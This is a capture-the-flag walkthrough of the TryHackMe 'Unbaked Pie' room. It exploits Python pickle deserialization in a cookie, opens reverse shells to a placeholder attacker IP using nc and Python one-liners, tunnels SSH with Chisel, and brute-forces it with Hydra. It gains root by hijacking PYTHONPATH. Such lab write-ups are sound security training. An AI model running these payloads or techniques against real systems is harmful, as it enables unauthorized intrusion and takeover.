# [Unbaked Pie](https://tryhackme.com/room/unbakedpie)

## Don't over-baked your pie!

# Capture The Flag

### User Flag

1. Start by scanning the target machine to identify open ports and running services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
5003/tcp open  http    WSGIServer 0.2 (Python 3.8.6)
```

2. Navigate to the web application and explore the `/search` endpoint. When making a POST request to `/search`, the server returns a cookie named `search_cookie` with the value `"gASVCAAAAAAAAACMBHRlc3SULg=="`. This appears to be a base64-encoded Python pickle object.

```bash
python
import pickle
val = b"gASVCAAAAAAAAACMBHRlc3SULg=="
from base64 import b64decode
test = b64decode(val)
test
pickle.loads(test)
```

<img width="578" height="211" alt="SCREEN01" src="https://github.com/user-attachments/assets/c1027617-d80a-4277-b1b7-b5fa1c0c5fae" />

This confirms the application is using Python's pickle module for serialization, which is vulnerable to remote code execution when deserializing untrusted data.

3. Create a malicious pickle payload that will execute a reverse shell command when deserialized by the server.

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

4. Prepare a netcat listener to catch the reverse shell connection.

```bash
nc -lvnp 4444
```

5. Send a POST request to the `/search` endpoint with the generated malicious pickle payload as the `search_cookie` parameter.

<img width="650" height="539" alt="SCREEN02" src="https://github.com/user-attachments/assets/709c8237-a136-4292-ae18-44a757b4c4f2" />

6. Once inside the container, enumerate the environment and check the command history.

```bash
cat /root/.bash_history
```

**Results:**

```bash
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py
exit
ls
cd site/
ls
cd bakery/
nano settings.py
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
```

The bash history reveals that someone has been SSH'ing to `ramsey@172.17.0.1`, indicating the host machine has a user named "ramsey" and SSH is running.

7. Scan the Docker host to identify open ports from within the container.

```bash
nc -zv 172.17.0.1 1-65535
```

**Results:**

```
ip-172-17-0-1.eu-central-1.compute.internal [172.17.0.1] 5003 (?) open
ip-172-17-0-1.eu-central-1.compute.internal [172.17.0.1] 22 (ssh) open
```

SSH is running on port 22 on the host machine.

8. Since we cannot directly access the host's SSH from our attacking machine, we'll use Chisel for port forwarding. Download the appropriate Chisel binary from `https://github.com/jpillora/chisel/releases` for your attacking machine.

```bash
chmod +x chisel
./chisel server --reverse --port 9002
```

9. Transfer the Chisel binary to the Docker container (you can host it on a web server and wget it, or use other file transfer methods).

```bash
chmod +x chisel
./chisel client <ATTACKER_IP>:9002 R:9003:172.17.0.1:22
```

This creates a reverse tunnel, forwarding port 9003 on your attacking machine to port 22 on 172.17.0.1.

10. Use Hydra to brute-force the SSH credentials for user "ramsey".

```bash
hydra -l ramsey -P /usr/share/wordlists/rockyou.txt -s 9003 ssh://127.0.0.1
```

11. Once logged in as ramsey, capture the user flag.

```bash
cat user.txt
```

<img width="599" height="409" alt="SCREEN03" src="https://github.com/user-attachments/assets/37f9567a-ffd9-43a4-8253-10ada64772a6" />

---

### Root Flag

1. Check what sudo privileges the user "ramsey" has.

```bash
sudo -l
```

**Results:**

```
User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

Ramsey can execute `/home/ramsey/vuln.py` as user "oliver" using Python.

2. On your attacking machine, set up another netcat listener for the next reverse shell.

```bash
nc -lvnp 4444
```

3. Since we control the `vuln.py` file in ramsey's home directory, we can replace it with a reverse shell script to gain access as oliver.

```bash
mv vuln.py /tmp/vuln.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> vuln.py
sudo -u oliver python /home/ramsey/vuln.py
```

4. Once you have a shell as oliver, check their sudo permissions.

```bash
sudo -l
```

**Results:**

```
User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

Oliver can run `/opt/dockerScript.py` as root with the `SETENV` permission, which allows setting environment variables. This is critical for privilege escalation.

5. Examine the script to understand what it does.

```bash
cat /opt/dockerScript.py
```

**Results:**

```python
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

The script imports the `docker` module. Since we can set environment variables with `SETENV`, we can hijack the Python module search path using `PYTHONPATH`.

6. Create a malicious `docker.py` file in a writable location and use `PYTHONPATH` to make Python load our malicious module instead of the legitimate one.

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /dev/shm/docker.py
sudo PYTHONPATH=/dev/shm/ python /opt/dockerScript.py
```

7. Once you have a root shell, retrieve the root flag.

```bash
cat /root/root.txt
```

<img width="437" height="243" alt="SCREEN04" src="https://github.com/user-attachments/assets/1b2fc3db-c988-4790-a7a2-4b73be345d42" />
